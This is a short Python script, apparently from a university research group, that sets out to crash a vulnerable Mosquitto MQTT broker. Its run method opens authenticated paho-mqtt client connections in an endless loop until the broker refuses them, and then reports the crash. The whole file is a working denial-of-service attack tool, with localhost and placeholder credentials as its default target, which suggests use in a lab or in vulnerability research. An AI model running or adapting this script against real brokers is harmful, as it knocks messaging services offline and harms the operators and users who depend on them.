#!/usr/bin/env python3

"""
dos.py, Crashes a vulnerable mosqsuitto broker
@author: tzimmermann @ AG Verteilte Systeme, Uni Osnabrueck
@date: 19.03.2018
"""

import paho.mqtt.client as mqtt
import time


class MQTT_DoS:

    def __init__(self, hostname, port, credentials):
        """Constructor sets up a Denial of Service Attack
           :param string hostname: Hostname or IP of the broker
           :param int port: Port of the broker
           :param tuple credentials: tuple of valid username and password for a client
           """
        self.host = hostname
        self.port = port
        self.cred = credentials

        # TODO: Implement me
        # Check of host, port cred are valid

    def on_sub_connect(self, client, userdata, flags, rc):
        print('Framework: Connected')

    def run(self):
        """Start new paho-mqtt clients until the broker seems crashed, then return
           :return : return without value if broker has crashed
           """

        user, pw = self.cred
        conns = []
        print('Trying to crash broker at ', self.host,':',self.port)

        # Number of Clients to crash: 42 -> NICE :)
        counter = 0
        try:
            while True:
                # Give unique clientIDs
                subscriber = mqtt.Client(client_id='Client'+str(counter))
                subscriber.username_pw_set(user, pw)
                subscriber.connect(self.host, self.port)
                subscriber.loop_start()
                print('Status Client' + str(counter), subscriber.is_connected())
                conns.append(subscriber)
                time.sleep(0.5)
                counter += 1
        except ConnectionRefusedError:
            print('Broker crashed')
            time.sleep(1)
            # Seconds broker waits to restart: 10s
            return

        # return if broker has crashed
        return


if __name__ == '__main__':
    # parser = argparse.ArgumentParser(description='Launches multiple mqtt-subscribers until the broker crashes')
    # parser.add_argument('--broker', '-b',
    #                     help='hostname or ip of the broker to connect to',
    #                     default='localhost')
    # parser.add_argument('--port', '-p',
    #                     help='port of the broker',
    #                     default='1883',
    #                     type=int)
    # parser.add_argument('--user', '-u',
    #                     help='user',
    #                     default='username',
    #                     type=str)
    # parser.add_argument('--password', '-P',
    #                     help='password',
    #                     default='Password for >username<',
    #                     type=str)
    # args = parser.parse_args()
    # crasher = MQTT_DoS(args.broker, args.port, (args.user, args.password))
    crasher = MQTT_DoS('localhost', 1883, ('legit_publisher',
                                           'insecure_publisher_password'))
    crasher.run()
